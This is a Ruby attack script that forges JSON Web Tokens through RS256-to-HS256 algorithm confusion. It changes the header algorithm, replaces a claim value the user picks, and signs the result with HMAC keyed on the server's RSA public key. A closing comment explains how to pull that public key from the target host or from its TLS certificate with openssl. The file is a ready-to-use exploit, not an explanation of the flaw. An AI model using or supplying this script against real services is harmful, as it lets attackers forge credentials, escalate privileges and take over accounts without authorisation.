#!/usr/bin/ruby

require 'base64'
require 'openssl'

pub = File.open("public.pem").read

puts "Enter the JWT Token: "
STDOUT.flush  
jwt = gets.chomp

header, payload, signature = jwt.split('.')

puts "\n"

decoded_header = Base64.decode64(header)
decoded_header.gsub!("RS256", "HS256")
puts "The new header is: "+ decoded_header
new_header = Base64.strict_encode64(decoded_header).gsub("=", "")
puts "\n"

decoded_payload = Base64.decode64(payload)
puts "Enter the existing value of claim you want to change in Payload Section: "
existing = gets.chomp
puts "\n"
puts "Enter the new value of claim you want to use in Payload Section: "
new = gets.chomp
puts "\n"
decoded_payload.gsub!(existing, new)
puts "The new payload is: "+decoded_payload
new_payload = Base64.strict_encode64(decoded_payload).gsub("=", "")
puts "\n"

data = new_header+"."+new_payload

signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), pub, data))
puts "The new JWT signature is: "+ data+"."+signature
puts "\n"





=begin

For Finding Public Key which Server is using:

1) Directly from host/public.key
2) Server’s TLS certificate, which may be being re-used for JWT operations:

openssl s_client -connect <hostname>:443
Copy the “Server certificate” output to a file (e.g. cert.pem) and extract the public key (to a file called key.pem) by running:

openssl x509 -in cert.pem -pubkey –noout > key.pem

=end


